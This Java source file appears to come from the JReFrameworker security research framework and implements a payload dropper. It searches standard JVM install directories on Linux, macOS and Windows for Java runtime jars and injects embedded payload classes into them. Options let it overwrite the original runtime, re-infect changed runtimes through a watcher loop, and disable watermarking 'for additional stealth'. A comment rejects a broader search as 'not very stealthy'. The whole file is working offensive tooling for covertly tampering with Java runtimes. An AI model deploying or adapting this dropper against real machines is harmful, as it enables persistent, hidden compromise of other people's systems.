package com.jreframeworker.dropper;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.io.StringReader;
import java.io.StringWriter;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.channels.OverlappingFileLockException;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Scanner;
import java.util.Set;
import java.util.jar.JarException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import com.jreframeworker.engine.Engine;
import com.jreframeworker.engine.utils.JarModifier;

public class Dropper {
	
	// jar contents
	public static final String CONFIG_FILE = "config.xml";
	public static final String PAYLOAD_DIRECTORY = "payloads";
	public static final String WATERMARK = "jref";
	
	// configuration keys
	public static final String MERGE_RENAME_PREFIX = "merge-rename-prefix";
	
	public static final String[] JVM_LOCATIONS = {
		// Linux
		"/usr/java/",
		"/usr/lib/jvm/",
		// OSX
		"/Library/Java/",
		"/System/Library/Frameworks/JavaVM.framework/",
		"/usr/libexec/java_home/",
		// Windows
		"C:\\Program Files\\Java\\",
		"C:\\Program Files (x86)\\Java\\",
		"C:\\Windows\\System32\\Java\\",
		"C:\\Windows\\SysWOW64\\Java\\"
	};
	
	private static final String VERSION_LONG_ARGUMENT = "--version";
	private static final String VERSION_SHORT_ARGUMENT = "-v";
	private static final String VERSION_DESCRIPTION = "1.3.1";
	
	private static final String ENFORCE_SINGLE_INSTANCE_LONG_ARGUMENT = "--single-instance";
	private static final String ENFORCE_SINGLE_INSTANCE_SHORT_ARGUMENT = "-si";
	private static final String ENFORCE_SINGLE_INSTANCE_DESCRIPTION = "       This flag enforces (using a file lock) that only a single instance of the dropper may execute at one time.";
	private static boolean singleInstance = false;
	
	private static final String SAFETY_OFF_LONG_ARGUMENT = "--safety-off";
	private static final String SAFETY_OFF_SHORT_ARGUMENT = "-so";
	private static final String SAFETY_OFF_DESCRIPTION = "            This flag must be specified to execute the modifications specified by embedded payloads (enabling the flag disables the built-in safety).";
	private static boolean safetyOff = false;
	
	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "       Specifies the output directory to save modified runtimes, if not specified output files will be written as temporary files.";
	private static File outputDirectory = null;
	
	private static final String REPLACE_TARGET_LONG_ARGUMENT = "--replace-target";
	private static final String REPLACE_TARGET_SHORT_ARGUMENT = "-r";
	private static final String REPLACE_TARGET_DESCRIPTION = "         Attempt to replace target with modified target.";
	private static boolean replaceTarget = false;

	private static final String PRINT_TARGETS_LONG_ARGUMENT = "--print-targets";
	private static final String PRINT_TARGETS_SHORT_ARGUMENT = "-pt";
	private static final String PRINT_TARGETS_DESCRIPTION = "         Prints the targets of the dropper and exits.";
	private static boolean printTargets = false;
	
	private static final String PRINT_PAYLOADS_LONG_ARGUMENT = "--print-payloads";
	private static final String PRINT_PAYLOADS_SHORT_ARGUMENT = "-pp";
	private static final String PRINT_PAYLOADS_DESCRIPTION = "        Prints the payloads of the dropper and exits.";
	private static boolean printPayloads = false;
	
	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
	private static final String SEARCH_DIRECTORIES_DESCRIPTION = "     Specifies a comma separated list of directory paths to search for targets, if not specified a default set of search directories will be used.";

	private static final String PRINT_WATERMARKED_LONG_ARGUMENT = "--print-watermarked";
	private static final String PRINT_WATERMARKED_SHORT_ARGUMENT = "-pw";
	private static final String PRINT_WATERMARKED_DESCRIPTION = "     Prints watermarked targets found on search paths.";
	private static boolean printWatermarked = false;
	
	private static boolean watermark = true;
	private static final String DISABLE_WATERMARK_LONG_ARGUMENT = "--disable-watermarking";
	private static final String DISABLE_WATERMARK_SHORT_ARGUMENT = "-dw";
	private static final String DISABLE_WATERMARK_DESCRIPTION = "  Disables watermarking the modified target (can be used for additional stealth, but could also cause problems for watchers). Watermarks are used to prevent remodifying a target.";
	
	private static boolean ignoreWatermarks = false;
	private static final String IGNORE_WATERMARK_LONG_ARGUMENT = "--ignore-watermarks";
	private static final String IGNORE_WATERMARK_SHORT_ARGUMENT = "-iw";
	private static final String IGNORE_WATERMARK_DESCRIPTION = "     Ignores watermarks and modifies targets regardless of whether or not they have been previously modified.";
	
	private static final String WATCHER_SLEEP_TIME_LONG_ARGUMENT = "--watcher-sleep";
	private static final String WATCHER_SLEEP_TIME_SHORT_ARGUMENT = "-ws";
	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "         The amount of time in milliseconds to sleep between watcher checks.";
	private static long watcherSleepTime = (long) (1000 * 60); // 1 minute
	
	private static boolean watcher = false;
	private static final String WATCHER_LONG_ARGUMENT = "--watcher";
	private static final String WATCHER_SHORT_ARGUMENT = "-w";
	private static final String WATCHER_DESCRIPTION = "                Enables a watcher process that waits to modify any discovered runtimes until the file hash of the runtime has changed (by default the process sleeps for 1 minute, unless the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified).";
	
	private static final String DEBUG_LONG_ARGUMENT = "--debug";
	private static final String DEBUG_SHORT_ARGUMENT = "-d";
	private static final String DEBUG_DESCRIPTION = "                  Prints debug information.";
	private static boolean debug = false;
	
	private static final String HELP_LONG_ARGUMENT = "--help";
	private static final String HELP_SHORT_ARGUMENT = "-h";
	private static final String HELP_DESCRIPTION = "Usage: java -jar dropper.jar [options]\n" 
													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "                   Prints this menu and exits.\n"
													+ SAFETY_OFF_LONG_ARGUMENT + ", " + SAFETY_OFF_SHORT_ARGUMENT + SAFETY_OFF_DESCRIPTION + "\n"
													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
													+ REPLACE_TARGET_LONG_ARGUMENT + ", " + REPLACE_TARGET_SHORT_ARGUMENT + REPLACE_TARGET_DESCRIPTION + "\n"
													+ DISABLE_WATERMARK_LONG_ARGUMENT + ", " + DISABLE_WATERMARK_SHORT_ARGUMENT + DISABLE_WATERMARK_DESCRIPTION + "\n"
													+ IGNORE_WATERMARK_LONG_ARGUMENT + ", " + IGNORE_WATERMARK_SHORT_ARGUMENT + IGNORE_WATERMARK_DESCRIPTION + "\n"
													+ ENFORCE_SINGLE_INSTANCE_LONG_ARGUMENT + ", " + ENFORCE_SINGLE_INSTANCE_SHORT_ARGUMENT + ENFORCE_SINGLE_INSTANCE_DESCRIPTION + "\n"
													+ WATCHER_LONG_ARGUMENT + ", " + WATCHER_SHORT_ARGUMENT + WATCHER_DESCRIPTION + "\n"
													+ WATCHER_SLEEP_TIME_LONG_ARGUMENT + ", " + WATCHER_SLEEP_TIME_SHORT_ARGUMENT + WATCHER_SLEEP_TIME_DESCRIPTION + "\n"
													+ PRINT_WATERMARKED_LONG_ARGUMENT + ", " + PRINT_WATERMARKED_SHORT_ARGUMENT + PRINT_WATERMARKED_DESCRIPTION + "\n"
													+ PRINT_TARGETS_LONG_ARGUMENT + ", " + PRINT_TARGETS_SHORT_ARGUMENT + PRINT_TARGETS_DESCRIPTION + "\n"
													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
													+ DEBUG_LONG_ARGUMENT + ", " + DEBUG_SHORT_ARGUMENT + DEBUG_DESCRIPTION + "\n"
													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "                Prints the version of the dropper and exists.";
	
	public static void main(String[] args){
		
		if(args.length == 0){
			System.out.println(HELP_DESCRIPTION);
			System.exit(0);
		}

		String[] searchPaths = null;
		for(int i=0; i<args.length; i++){
			if(args[i].equals(HELP_LONG_ARGUMENT) || args[i].equals(HELP_SHORT_ARGUMENT)){
				System.out.println(HELP_DESCRIPTION);
				System.exit(0);
			}
			
			else if(args[i].equals(OUTPUT_DIRECTORY_LONG_ARGUMENT) || args[i].equals(OUTPUT_DIRECTORY_SHORT_ARGUMENT)){
				try {
					outputDirectory = new File(args[++i]);
					outputDirectory.mkdirs();
					if(!outputDirectory.exists()){
						throw new Exception("Unable to create output directory.");
					}
				} catch (Exception e){
					System.err.println("Invalid argument.  Option [" 
							+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT
							+ "+ ] requires a valid output directory.");
					System.exit(1);
				}
			}
			
			else if(args[i].equals(ENFORCE_SINGLE_INSTANCE_LONG_ARGUMENT) || args[i].equals(ENFORCE_SINGLE_INSTANCE_SHORT_ARGUMENT)){
				singleInstance = true;
			}
			
			else if(args[i].equals(REPLACE_TARGET_LONG_ARGUMENT) || args[i].equals(REPLACE_TARGET_SHORT_ARGUMENT)){
				replaceTarget = true;
			}
			
			else if(args[i].equals(PRINT_WATERMARKED_LONG_ARGUMENT) || args[i].equals(PRINT_WATERMARKED_SHORT_ARGUMENT)){
				printWatermarked = true;
			}
			
			else if(args[i].equals(PRINT_TARGETS_LONG_ARGUMENT) || args[i].equals(PRINT_TARGETS_SHORT_ARGUMENT)){
				printTargets = true;
			}
			
			else if(args[i].equals(PRINT_PAYLOADS_LONG_ARGUMENT) || args[i].equals(PRINT_PAYLOADS_SHORT_ARGUMENT)){
				printPayloads = true;
			}
			
			else if(args[i].equals(SEARCH_DIRECTORIES_LONG_ARGUMENT) || args[i].equals(SEARCH_DIRECTORIES_SHORT_ARGUMENT)){
				try {
					searchPaths = args[++i].split(",");
				} catch (Exception e){
					System.err.println("Invalid argument.  Option [" 
							+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT
							+ "+ ] requires a comma seperated list of search directories.");
					System.exit(1);
				}
			}
			
			else if(args[i].equals(DEBUG_LONG_ARGUMENT) || args[i].equals(DEBUG_SHORT_ARGUMENT)){
				debug = true;
			}
			
			else if(args[i].equals(SAFETY_OFF_LONG_ARGUMENT) || args[i].equals(SAFETY_OFF_SHORT_ARGUMENT)){
				safetyOff = true;
			}
			
			else if(args[i].equals(WATCHER_LONG_ARGUMENT) || args[i].equals(WATCHER_SHORT_ARGUMENT)){
				watcher = true;
			}
			
			else if(args[i].equals(DISABLE_WATERMARK_LONG_ARGUMENT) || args[i].equals(DISABLE_WATERMARK_SHORT_ARGUMENT)){
				watermark = false;
			}
			
			else if(args[i].equals(IGNORE_WATERMARK_LONG_ARGUMENT) || args[i].equals(IGNORE_WATERMARK_SHORT_ARGUMENT)){
				ignoreWatermarks = true;
			}
			
			else if(args[i].equals(WATCHER_SLEEP_TIME_LONG_ARGUMENT) || args[i].equals(WATCHER_SLEEP_TIME_SHORT_ARGUMENT)){
				try {
					watcherSleepTime = Long.parseLong(args[++i]);
				} catch (Exception e){
					System.err.println("Invalid argument.  Option [" 
							+ WATCHER_SLEEP_TIME_LONG_ARGUMENT + ", " + WATCHER_SLEEP_TIME_SHORT_ARGUMENT
							+ "+ ] must be a long value.");
					System.exit(1);
				}
			}

			else if(args[i].equals(VERSION_LONG_ARGUMENT) || args[i].equals(VERSION_SHORT_ARGUMENT)){
				System.out.println(VERSION_DESCRIPTION);
				System.exit(0);
			}
			
			else {
				System.out.println("Invalid argument: " + args[i]);
				System.exit(1);
			}
		}
		
		if(singleInstance){
			if(isAnotherApplicationInstanceActive()){
				System.err.println("Another instance is active. Exiting...");
				System.exit(-1);
			}
		}
		
		// load configurations
		Configuration parsedConfiguration = null;
		InputStream configStream = Dropper.class.getResourceAsStream("/" + CONFIG_FILE);
		try {
			if(configStream == null){
				throw new IllegalArgumentException("Configuration file is missing.\n");
			} else {
				try {
					StringBuilder xml = new StringBuilder();
					Scanner scanner = new Scanner(configStream);
					while(scanner.hasNextLine()){
						xml.append(scanner.nextLine() + "\n");
					}
					scanner.close();
					parsedConfiguration = new Configuration(xml.toString());
				} catch (Exception e){
					throw new IllegalArgumentException("Configuration file is corrupted.\n");
				}
			}
		} catch (Exception e){
			System.err.println(e.getMessage());
			System.out.println(HELP_DESCRIPTION);
			System.exit(1);
		}
		
		final Configuration configuration = parsedConfiguration;

		if(printTargets){
			System.out.println("Runtime Targets: " + configuration.runtimes.toString());
			System.out.println("Library Targets: " + configuration.libraries.toString());
			System.exit(0);
		}

		if(printPayloads){
			System.out.println("Payloads: " + configuration.payloadClassNames.toString());
			System.exit(0);
		}
		
		ArrayList<String> classFiles = new ArrayList<String>(configuration.payloadClassNames);
		byte[][] payloads = new byte[classFiles.size()][];
		for(int i=0; i<classFiles.size(); i++){
			String classFile = classFiles.get(i);
			try {
				InputStream classFileStream = Dropper.class.getResourceAsStream("/" + PAYLOAD_DIRECTORY + "/" + classFile);
				byte[] payloadBytes = getBytes(classFileStream);
				payloads[i] = payloadBytes;
			} catch (Exception e) {
				if(debug) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
				if(debug) e.printStackTrace();
			}
		}
		
		if(debug) System.out.println(configuration);
		
		if(printWatermarked){
			for(File target : getTargets(searchPaths, configuration)){
				try {
					if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
						System.out.println("Watermarked Target: " + target.getAbsolutePath());
					}
				} catch (Exception e){
					// couldn't read target entries
				}
			}
			System.exit(0);
		}
		
		// modify runtimes
		Set<String> targetsToIgnore = new HashSet<String>();
		for(File target : getTargets(searchPaths, configuration)){
			
			if(!ignoreWatermarks){
				try {
					if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
						if(debug){
							System.out.println("Ignoring watermarked target: " + target.getAbsolutePath());
						}
						continue;
					}
				} catch (Exception e){
					// couldn't read target entries
				}
			}
			
			if(debug){
				System.out.println("Discovered target: " + target.getAbsolutePath());
			}
			if(safetyOff){
				if(watcher){
					try {
						targetsToIgnore.add(sha256(target));
					} catch (Exception e) {
						// skipping runtime
					}
				} else {
					modifyTarget(configuration, payloads, target, watermark, replaceTarget);
				}
			}
		}
		
		if (safetyOff && watcher) {
			boolean searching = true;
			while (searching) {
				try {
					if(debug){
						System.out.println("Sleeping: " + watcherSleepTime + "ms");
					}
					
					// sleep
					Thread.sleep(watcherSleepTime);
					
					// search for new targets
					for (File target : getTargets(searchPaths, configuration)) {
						try {
							if(!ignoreWatermarks){
								try {
									if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
										continue;
									}
								} catch (Exception e){
									// couldn't read target entries
								}
							}
							
							if (!targetsToIgnore.contains(sha256(target))) {
								if (debug) {
									System.out.println("Discovered target: " + target.getAbsolutePath());
								}

								searching = false;
								modifyTarget(configuration, payloads, target, watermark, replaceTarget);
							}
						} catch (Exception e) {
							// skipping runtime
						}
					}
				} catch (InterruptedException ie) {
					// couldn't sleep, try again
				}
			}
		}
		
		if(debug) System.out.println("Finished.");
	}

	private static void modifyTarget(Configuration configuration, byte[][] payloads, File runtime, boolean watermark, boolean replaceTarget) {
		try {
			File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
			if(replaceTarget){
				outputRuntime = runtime;
			}
			modifyTarget(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, watermark, payloads);
			System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
		} catch (Exception e) {
			if(debug) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
			if(debug) e.printStackTrace();
		}
	}
	
	private static File getOutputRuntimeFile(File runtime, File outputDirectory) {
		File outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName());
		int num = 2;
		while(outputRuntime.exists()){
			outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName().replace(".jar", "_") + num++ + ".jar");
		}
		return outputRuntime;
	}

	private static byte[] getBytes(InputStream is) throws IOException {
		int len;
		int size = 1024;
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[size];
		while ((len = is.read(buffer, 0, size)) != -1) {
			bos.write(buffer, 0, len);
		}
		return bos.toByteArray();
	}
	
	private static LinkedList<File> getTargets(String[] searchPaths, Configuration configuration){
		HashSet<String> targetNames = new HashSet<String>();
		targetNames.addAll(configuration.runtimes);
		targetNames.addAll(configuration.libraries);
		LinkedList<File> targets = new LinkedList<File>();
		
		// establish a set of directories to search for runtimes
		LinkedList<File> searchDirectories = new LinkedList<File>();

		if(searchPaths != null){
			if(debug) System.out.println("Searching: " + Arrays.toString(searchPaths));
			// look for specified jvm locations
			for(String path : searchPaths){
				File location = new File(path);
				if(location.exists()){
					searchDirectories.add(location);
				}
			}
		} else {
			// look for known jvm locations
			if(debug) System.out.println("Searching: " + Arrays.toString(JVM_LOCATIONS));
			for(String path : JVM_LOCATIONS){
				File location = new File(path);
				if(location.exists()){
					searchDirectories.add(location);
				}
			}
		}
		
		// search each directory for runtimes
		for(File searchDirectory : searchDirectories){
			targets.addAll(search(searchDirectory, targetNames));
		}

		// Note: removed this functionality, as it is way to expensive...not very stealthy
//		// unknown location, expand search to entire file system
//		if(runtimes.isEmpty()){
//			for(File rootDirectory : File.listRoots()){
//				runtimes.addAll(search(rootDirectory, runtimeNames));
//			}	
//		}

		return targets;
	}
	
	private static LinkedList<File> search(File directory, HashSet<String> fileNames){
		LinkedList<File> results = new LinkedList<File>();
		search(directory, fileNames, results);
		return results;
	}
	
	private static void search(File directory, HashSet<String> fileNames, LinkedList<File> results) {
		File[] files = directory.listFiles();
		if(files != null){
			for(File file : files) {
				if(file.isDirectory()) {
					search(file, fileNames, results);
				} else if(fileNames.contains(file.getName())) {
					results.add(file);
				}
			}
		}
	}
	
	// TODO: Consider accepting and writing to an output stream instead of a File so that we could generically write to a file, memory, stdout, etc.
	// TODO: need to consider alternate class loaders
	private static void modifyTarget(File originalRuntime, String mergeRenamePrefix, File outputRuntime, boolean watermark, byte[]... classFiles) throws JarException, IOException {
		Engine engine = new Engine(originalRuntime, mergeRenamePrefix);
		for(byte[] classFile : classFiles){
			engine.process(classFile);
		}
		if(watermark){
			engine.addFile(WATERMARK, WATERMARK.getBytes(), true);
		}
		engine.save(outputRuntime);
	}
	
	public static class Configuration {
		
		public static final String CONFIGURATIONS = "configurations";
		public static final String CONFIGURATION = "configuration";
		public static final String TARGETS = "targets";
		public static final String TARGET = "target";
		public static final String RUNTIME = "runtime";
		public static final String PAYLOAD_CLASSES = "payload-classes";
		public static final String PAYLOAD_CLASS = "payload-class";
		public static final String NAME = "name";
		
		public Map<String,String> configurations = new HashMap<String,String>();
		public Set<String> payloadClassNames = new HashSet<String>();
		public Set<String> runtimes = new HashSet<String>();
		public Set<String> libraries = new HashSet<String>();
		
		@Override
		public String toString() {
			return "Configuration [configurations=" + configurations + ", payloadClasses=" + payloadClassNames
					+ ", runtimes=" + runtimes + ", libraries=" + libraries + "]";
		}
		
		public Configuration(){}
		
		public Configuration(String xml) throws ParserConfigurationException, SAXException, IOException {
			DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
			InputSource inputStream = new InputSource(new StringReader(xml));
			Document doc = dBuilder.parse(inputStream);
			doc.getDocumentElement().normalize();
			NodeList targets = doc.getElementsByTagName(TARGET);
			for (int i = 0; i < targets.getLength(); i++) {
				Element target = (Element) targets.item(i);
				String name = target.getAttribute(NAME);
				Boolean runtime = false;
				if(target.hasAttribute(RUNTIME)){
					runtime = Boolean.parseBoolean(target.getAttribute(RUNTIME));
				}
				if(runtime){
					runtimes.add(name);
				} else {
					libraries.add(name);
				}
			}
			NodeList classes = doc.getElementsByTagName(PAYLOAD_CLASS);
			for (int i = 0; i < classes.getLength(); i++) {
				Element clazz = (Element) classes.item(i);
				String name = clazz.getAttribute(NAME);
				this.payloadClassNames.add(name);
			}
			NodeList configurations = doc.getElementsByTagName(CONFIGURATION);
			for (int i = 0; i < configurations.getLength(); i++) {
				Element configuration = (Element) configurations.item(i);
				NamedNodeMap attributes = configuration.getAttributes();
				for (int j = 0; j < attributes.getLength(); j++){
				    Node attribute = attributes.item(i);
				    this.configurations.put(attribute.getNodeName(), attribute.getNodeValue());
				}
			}
		}
		
		public String getXML() throws ParserConfigurationException, TransformerException {
			// create xml document
			DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
			
			// add root element
			Document doc = docBuilder.newDocument();
			Element rootElement = doc.createElement("payload");
			doc.appendChild(rootElement);
			
			// record general modification configurations
			Element configurationsElement = doc.createElement(CONFIGURATIONS);
			for(Entry<String,String> entry : configurations.entrySet()){
				Element configurationElement = doc.createElement(CONFIGURATION);
				configurationElement.setAttribute(entry.getKey(), entry.getValue());
				configurationsElement.appendChild(configurationElement);
			}
			rootElement.appendChild(configurationsElement);
			
			// record targets to modify
			Element targetsElement = doc.createElement(TARGETS);
			
			// add each runtime target to the configuration
			for(String target : runtimes){
				Element targetElement = doc.createElement(TARGET);
				targetElement.setAttribute(NAME, target);
				targetElement.setAttribute(RUNTIME, "true");
				targetsElement.appendChild(targetElement);
			}

			// add each library target to the configuration
			for(String target : libraries){
				Element targetElement = doc.createElement(TARGET);
				targetElement.setAttribute(NAME, target);
				targetElement.setAttribute(RUNTIME, "false");
				targetsElement.appendChild(targetElement);
			}
			rootElement.appendChild(targetsElement);
			
			// add each payload class name to the configuration
			Element classesElement = doc.createElement(PAYLOAD_CLASSES);
			for(String clazz : payloadClassNames){
				Element classElement = doc.createElement(PAYLOAD_CLASS);
				classElement.setAttribute(NAME, clazz);
				classesElement.appendChild(classElement);
			}
			rootElement.appendChild(classesElement);
			
			// write xml to string result
			TransformerFactory transformerFactory = TransformerFactory.newInstance();
			Transformer transformer = transformerFactory.newTransformer();
			transformer.setOutputProperty(OutputKeys.INDENT, "yes");
			transformer.setOutputProperty("{http://xml.apache.org/xslt}indent-amount", "2");
			DOMSource source = new DOMSource(doc);
			StringWriter xml = new StringWriter();
			StreamResult result = new StreamResult(xml);
			transformer.transform(source, result);
			return xml.toString();
		}
	}
	
	private static String sha256(File file) throws IOException, NoSuchAlgorithmException {
		MessageDigest digest = MessageDigest.getInstance("SHA-256");
		byte[] contents = Files.readAllBytes(file.toPath());
		byte[] hash = digest.digest(contents);
		StringBuilder result = new StringBuilder();
		for (int i = 0; i < hash.length; i++) {
			result.append(Integer.toString((hash[i] & 0xFF) + 0x100, 16).substring(1));
		}
		return result.toString();
	}
	
	public static boolean isAnotherApplicationInstanceActive(){
		ApplicationInstanceLock instanceLock = new ApplicationInstanceLock(WATERMARK);
		return instanceLock.isAppActive();
	}
	
	// adapted from http://www.rgagnon.com/javadetails/java-0288.html
	private static class ApplicationInstanceLock {

		private String appName;
		private File file;
		private FileChannel channel;
		private FileLock lock;

		public ApplicationInstanceLock(String appName) {
			this.appName = appName;
		}

		@SuppressWarnings("resource")
		public boolean isAppActive() {
			try {
				file = new File(System.getProperty("user.home"), appName + ".tmp");
				channel = new RandomAccessFile(file, "rw").getChannel();

				try {
					lock = channel.tryLock();
				} catch (OverlappingFileLockException e) {
					// already locked
					closeLock();
					return true;
				}

				if (lock == null) {
					closeLock();
					return true;
				}

				Runtime.getRuntime().addShutdownHook(new Thread() {
					// destroy the lock when the JVM is closing
					public void run() {
						closeLock();
						deleteFile();
					}
				});
				return false;
			} catch (Exception e) {
				closeLock();
				return true;
			}
		}

		private void closeLock() {
			try {
				lock.release();
				channel.close();
			} catch (Exception e) {
			}
		}

		private void deleteFile() {
			try {
				file.delete();
			} catch (Exception e) {
			}
		}
	}
	
}
